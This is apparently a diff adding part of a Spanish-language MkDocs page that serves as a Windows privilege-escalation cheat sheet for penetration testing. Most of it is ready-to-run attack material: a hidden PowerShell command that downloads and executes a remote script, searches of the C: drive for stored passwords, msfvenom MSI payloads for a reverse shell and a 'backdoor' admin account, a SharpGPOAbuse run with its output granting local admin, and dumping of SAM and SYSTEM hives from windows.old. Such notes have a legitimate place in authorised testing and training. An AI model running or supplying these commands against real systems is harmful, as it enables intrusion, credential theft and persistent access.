+<li><strong>Ejecutar un comando en PowerShell interactivo</strong>: <code>runas /user:ACCESS\Administrator /savecred "powershell.exe -Command Get-Process"</code></li>
+<li><strong>Abrir el Explorador de Windows como administrador</strong>: <code>runas /user:ACCESS\Administrator /savecred "explorer.exe"</code></li>
+<li><strong>Ejecutar un script remoto</strong>: <code>runas /user:ACCESS\Administrator /savecred "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="seloaddriverprivilege">SeLoadDriverPrivilege<a class="headerlink" href="#seloaddriverprivilege" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Este privilegio permite la habilidad de cargar drivers en el sistema.</li>
+<li>Si aparece en <code>whoami /priv</code> como <code>Disabled</code> podemos utilizar <a href="https://github.com/G4sp4rCS/CPP-EnableSeLoadDriverPrivilege">este .exe</a> para re-habilitarlo</li>
+</ul>
+<h2 id="credential-harvesting">Credential harvesting<a class="headerlink" href="#credential-harvesting" title="Permanent link">&para;</a></h2>
+<ul>
+<li><code>Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.ini,*.config,*.json,*.log | Select-String -Pattern 'password|user|login|credential'</code></li>
+<li><code>Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue</code></li>
+<li><code>Get-History</code>: Muestra el historial de comandos ejecutados en la sesión actual de PowerShell.</li>
+<li><code>(Get-PSReadlineOption).HistorySavePath</code>: Muestra la ruta del archivo donde se guarda el historial de comandos de PowerShell.</li>
+</ul>
+<hr />
+<h2 id="semanagevolumeprivilege">SeManageVolumePrivilege<a class="headerlink" href="#semanagevolumeprivilege" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Este privilegio permite la habilidad de crear y eliminar volúmenes en el sistema.</li>
+<li>Podemos utilizar <a href="https://github.com/CsEnox/SeManageVolumeExploit/tree/main">el siguiente exploit</a> para elevar privilegios.</li>
+</ul>
+<h2 id="alwaysinstallelevated">AlwaysInstallElevated<a class="headerlink" href="#alwaysinstallelevated" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Este privilegio permite la habilidad de instalar software sin necesidad de permisos de administrador.</li>
+<li>Armamos un payload <code>msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.210 LPORT=135 -f msi &gt; payload.msi</code><ul>
+<li>Alternativa: <code>msfvenom -p cmd/windows/adduser USER=backdoor PASS=P@ssw0rd123 -f msi &gt; payload.msi</code></li>
+<li>Luego nos podemos conectar con winrm o usar runas</li>
+</ul>
+</li>
+</ul>
+<h2 id="gpoabuse">GPOAbuse<a class="headerlink" href="#gpoabuse" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7">Más info</a></li>
+<li>Podemos tener un usuario con varios permisos sobre las politicas del dominio.
+<img alt="alt text" src="../Pasted%20image%2020250509181313.png" /></li>
+<li>Podemos utilizar <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a> para intentar agregar un usuario al grupo de administradores del dominio.</li>
+<li><code>.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Charlotte --GPOName "Default Domain Policy"</code></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>*Evil-WinRM* PS C:\Users\charlotte\Documents&gt; .\.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount Charlotte --GPOName &quot;Default Domain Policy&quot;
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>[+] Domain = secura.yzx
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>[+] Domain Controller = dc01.secura.yzx
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>[+] Distinguished Name = CN=Policies,CN=System,DC=secura,DC=yzx
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>[+] SID Value of Charlotte = S-1-5-21-3453094141-4163309614-2941200192-1104
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>[+] GUID of &quot;Default Domain Policy&quot; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>[+] File exists: \\secura.yzx\SysVol\secura.yzx\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>[+] The GPO does not specify any group memberships.
+</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>[+] versionNumber attribute changed successfully
+</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>[+] The version number in GPT.ini was increased successfully.
+</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>[+] Done!
+</span></code></pre></div>
+<ul>
+<li><code>gpupdate /force</code></li>
+<li>Te puedes conectar con evil-winrm o meterpreter. </li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>*Evil-WinRM* PS C:\Users\charlotte\Documents&gt; net localgroup administrators
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>Alias name     administrators
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>Comment        Administrators have complete and unrestricted access to the computer/domain
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>Members
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>-------------------------------------------------------------------------------
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>Administrator
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>charlotte
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>The command completed successfully.
+</span></code></pre></div>
+<hr />
+<h2 id="windowsold-credential-dumping">windows.old credential dumping<a class="headerlink" href="#windowsold-credential-dumping" title="Permanent link">&para;</a></h2>
+<ul>
+<li>En caso de que la maquina tenga un windows.old, podemos intentar dumpear las credenciales de los usuarios que estaban en el sistema anterior.<ul>
+<li><code>copy C:\windows.old\Windows\System32\config\sam C:\sam.save</code></li>
+<li><code>copy C:\windows.old\Windows\System32\config\system C:\system.save</code></li>
+<li><code>secretsdump.py -sam sam.save -system system.save LOCAL</code></li>
+</ul>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/G4sp4rCS" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "content.code.copy", "content.action.edit", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+    
+  </body>
+</html>
